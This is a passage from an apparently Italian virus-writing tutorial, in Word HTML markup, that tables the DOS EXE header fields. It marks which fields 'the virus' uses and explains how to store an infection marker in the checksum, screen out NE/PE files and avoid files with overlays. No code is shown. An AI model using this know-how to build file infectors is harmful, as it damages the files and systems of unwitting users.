"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    
</span>indirizzo misura<span style="mso-spacerun: yes">    
</span>contenuto<span style="mso-spacerun: yes">         </span>descrizione<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">     </span>+<span
style="mso-spacerun: yes">  </span>0h<span style="mso-spacerun: yes">    
</span>Word<span style="mso-spacerun: yes">      </span>4Dh<span
style="mso-spacerun: yes">  </span>5Ah<span style="mso-spacerun: yes">      
</span>EXE signature (4Dh='M' and 5Ah='Z').Questi due caratteri ASCII <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                                       </span>(M e Z)
stanno per Mark<span style="mso-spacerun: yes">  </span>Zbikowski, uno dei
maggiori programatori <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                                       </span>DOS
della<span style="mso-spacerun: yes">  </span>Microsoft. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">     </span>*<span
style="mso-spacerun: yes">  </span>2h<span style="mso-spacerun: yes">    
</span>Word<span style="mso-spacerun: yes">      </span>PartPag<span
style="mso-spacerun: yes">          </span>Lunghezza del file mod (modulo) 512
lunghezza mod 512=nr di bytes <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                      </span><span style="mso-spacerun:
yes">                 </span>nell’ultima pagina<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">     </span>*<span
style="mso-spacerun: yes">  </span>4h<span style="mso-spacerun: yes">   
</span>Word<span style="mso-spacerun: yes">       </span>PageCnt<span
style="mso-spacerun: yes">         </span>Misura del file in pagine di 512
bytes incluso l’header. Se l’ultima <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                                       </span>pagina non è
piena viene inclusa ugualmente<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">        </span>6h<span
style="mso-spacerun: yes">     </span>Word<span style="mso-spacerun:
yes">       </span>ReloCnt<span style="mso-spacerun: yes">         
</span>Numero di voci nella tabella delle rilocazioni<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">       
</span>8h<span style="mso-spacerun: yes">    </span>Word<span
style="mso-spacerun: yes">        </span>HdrSize<span style="mso-spacerun:
yes">          </span>Misura dell’header in paragrafi gd16 bytes. Questo è usato
per <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                                        </span>“locare” l’inizio
del programma reale (modulo load) nel file<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">     </span>0Ah<span
style="mso-spacerun: yes">    </span>Word<span style="mso-spacerun:
yes">        </span>MinMem<span style="mso-spacerun: yes">         
</span>Memoria minima richiesta oltre la fine del programma caricato in <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                                         </span>paragrafi
da 16bytess. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span>0Ch<span
style="mso-spacerun: yes">    </span>Word <span style="mso-spacerun:
yes">        </span>MaxMem<span style="mso-spacerun: yes">        
</span>Memoria massima richiesta oltre il programma caricato in paragrafi <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                                         </span>da
16bytess. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span>*<span
style="mso-spacerun: yes">  </span>0Eh<span style="mso-spacerun: yes">  
</span>Word<span style="mso-spacerun: yes">         </span>ReloSS<span
style="mso-spacerun: yes">             </span>Offset del Segmento dello of
stack segment.(Usato per il settaggio del<span style="mso-spacerun: yes">     
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                                         </span>registro
SS)<span style="mso-spacerun: yes">                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span>*<span
style="mso-spacerun: yes">  </span>10h<span style="mso-spacerun: yes">  
</span>Word<span style="mso-spacerun: yes">         </span>ExeSP<span
style="mso-spacerun: yes">              </span>Valore per il registro SP (stack
pointer) quando il programma viene <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                              </span><span style="mso-spacerun:
yes">                           </span>lanciato <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>+<span style="mso-spacerun: yes">  </span>12h<span
style="mso-spacerun: yes">   </span>Word<span style="mso-spacerun:
yes">         </span>Checksum<span style="mso-spacerun: yes">        
</span>controllo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>*<span style="mso-spacerun: yes">  </span>14h<span
style="mso-spacerun: yes">  </span>Word<span style="mso-spacerun:
yes">           </span>ExeIP<span style="mso-spacerun: yes">               
</span>Valore per il registro IP (puntatore all’istruzione iniziale quando il <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                                   </span><span
style="mso-spacerun: yes">       </span>programma viene lanciato <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>*<span style="mso-spacerun: yes">  </span>16h<span
style="mso-spacerun: yes">  </span>Word<span style="mso-spacerun:
yes">          </span>ReloCS<span style="mso-spacerun: yes">              
</span>Offset del Segmento del codice.(Usato per il settaggio del registro <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                                                          </span>CS)<span
style="mso-spacerun: yes">                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>+<span style="mso-spacerun: yes">  </span>18h<span
style="mso-spacerun: yes">  </span>Word<span style="mso-spacerun:
yes">          </span>TablOff<span style="mso-spacerun: yes">              
</span>Offset nel file della tabella delle rilocazioni (spesso a 1Ch)<span
style="mso-spacerun: yes">                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>+<span style="mso-spacerun: yes">  </span>1Ah<span
style="mso-spacerun: yes">  </span>Word<span style="mso-spacerun: yes">       
</span>Overlay<span style="mso-spacerun: yes">                </span>Marcatore
di Overlay (0 per modulo base).<span style="mso-spacerun: yes">       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>1Ch<span style="mso-spacerun: yes">      
</span>Byte<span style="mso-spacerun: yes">             </span>?<span
style="mso-spacerun: yes">               </span><span style="mso-spacerun:
yes">         </span>(non documentato) di solito =<span style="mso-spacerun:
yes">  </span>to 01h <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">  </span>?<span
style="mso-spacerun: yes">            </span>4*?<span style="mso-spacerun:
yes">         </span>Ofs<span style="mso-spacerun: yes">  </span>Seg<span
style="mso-spacerun: yes">                </span>Tabella delle rilocazioni<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">  </span>....<span
style="mso-spacerun: yes">                                                     
</span>Ha [EXE+6] DWORD voci.<span style="mso-spacerun: yes">               
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun:
yes">                             </span>Ofs<span style="mso-spacerun: yes"> 
</span>Seg <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>?<span
style="mso-spacerun: yes">             </span>?<span style="mso-spacerun:
yes">                                        </span>Filler<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Nota: gli indirizzi marcati con '*' sono utilizzati
dal virus; quelli '+'=opzionali. Gli indirizzi opzionali possono essere usati
per differenti operazioni, come:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:25.5pt;text-align:justify;text-indent:
-17.0pt;mso-list:l2 level1 lfo2;tab-stops:list 26.5pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>la
“signature” (MZ or ZM) può essere usata per controllare se il file trovato è un
vero EXE o se è solo un file ridenominato;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:25.5pt;text-align:justify;text-indent:
-17.0pt;mso-list:l2 level1 lfo2;tab-stops:list 26.5pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>il
Checksum dall’indirizzo 12h può essere un posto utilizzato per marcatura di
infezione (ID bytes=one or two bytes that will &quot;mark&quot; an infected file);<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:25.5pt;text-align:justify;text-indent:
-17.0pt;mso-list:l2 level1 lfo2;tab-stops:list 26.5pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>la
TablOff dall’ indirizzo 18h viene utilizzata per verificare se il file è un
normale EXE DOS o un file PE o NE. Se la TablOff è più grande di 64 (40h),
l’EXE è in formato NE o PE. (NOTA:<span style="mso-spacerun: yes"> 
</span>tutti i<span style="mso-spacerun: yes">   </span>&quot;normali&quot;
files Windows EXE hanno TablOff uguale a '@'.<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:25.5pt;text-align:justify;text-indent:
-17.0pt;mso-list:l2 level1 lfo2;tab-stops:list 26.5pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>il
valore word Overlay<span style="mso-spacerun: yes">  </span>locato
all’indirizzo 1Ah può essere usato per controlllare se il file ha overlays o
no. Compara Overlay a 0. Se uguale allora il file non ha overlays ed è ok. Se
no, allora il file ha overlays interni<span style="mso-spacerun: yes"> 
</span>e infettandolo si distruggerebbero le informazioni.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Può essere un buon esercizio controllare i valori di
PartPag e PageCnt di un file EXE<span style="mso-spacerun: yes">  </span>e
comparare questi valori con I valori reali (la misura reale del file). Per
trovare la misura di un file si usa la seguente formula:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span><span
style="mso-spacerun:
yes">                                        </span>misura_file:=((PageCnt-1)*512)+PartPag<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>La tabella di rilocazione contiene gli indirizzi di
tutte le parole che necessitano un &quot;aggiustamento&quot;. La tabella di
rilocazione ha ReloCnt elementi cominciano da TablOff posizione nel file, e la
sua misura è ReloCnt*4 bytes.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>struttura di un programma EXE caricato in memoria:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">    </span></span><span
lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'>.-----------------------------------.
&lt;------ ES = 0000h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun: yes"> 
</span>Program Segment Prefix ( PSP ) |<span style="mso-spacerun: yes">    
</span>'-- DS = 0000h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun: yes">      
</span>100h bytes ( 256d )<span style="mso-spacerun: yes">              
</span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|-----------------------------------|
&lt;--- CS:IP ( pointed by header )<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun:
yes">                                                    </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun: yes">   
</span>Program Code Segment ( CS ) |<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun:
yes">                                                    </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|-----------------------------------|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun:
yes">                                                    </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun: yes">   
</span>Program Data Segment ( DS )<span style="mso-spacerun: yes">  </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun:
yes">                                                    </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|-----------------------------------|
&lt;------ SS = 0000h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun:
yes">                                                    </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun: yes">  
</span>Program Stack Segment ( SS )<span style="mso-spacerun: yes">  </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>|<span style="mso-spacerun:
yes">                                                    </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span>'-----------------------------------'
&lt;--- SS:SP ( pointed by header )<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
